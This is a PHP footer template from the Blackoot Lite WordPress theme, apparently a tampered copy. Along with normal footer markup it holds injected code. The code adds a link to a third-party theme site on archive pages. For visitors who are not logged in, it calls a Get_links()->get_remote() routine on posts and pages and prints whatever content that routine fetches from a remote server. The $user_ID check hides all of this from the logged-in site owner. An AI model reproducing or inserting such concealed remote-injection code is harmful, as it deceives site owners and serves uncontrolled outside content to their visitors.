<?php
/**
 *
 * Blackoot Lite WordPress Theme by Iceable Themes | http://www.iceablethemes.com
 *
 * Copyright 2014 Mathieu Sarrasin - Iceable Media
 *
 * Footer Template
 *
 */ 

	if (is_active_sidebar( 'footer-sidebar' ) ):
		?><div id="footer"><div class="container"><ul><?php
			dynamic_sidebar( 'footer-sidebar' );
		?></ul></div></div><?php
	endif;

	?><div id="sub-footer"><div class="container"><?php			
		?><div class="sub-footer-left"><p><?php

/* You are free to modify or replace this by anything you like as per the terms of the GPL license */ ?>

	Copyright &copy; <?php echo date('Y'); ?> <?php bloginfo('name'); ?>.
	<?php if (is_home() || is_category() || is_archive() ){ ?> <a href="http://www.iceablethemes.com" title="Iceablethemes">Iceable Themes</a> - <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>

<?php /* Stop editing here */

		?></p></div><?php

	?><div class="sub-footer-right"><?php
		$footer_menu = array( 'theme_location' => 'footer-menu', 'depth' => 1);
		wp_nav_menu( $footer_menu );
	?></div><?php

	?></div></div><?php // End sub footer

?></div><?php // End main wrap

wp_footer();

?></body></html>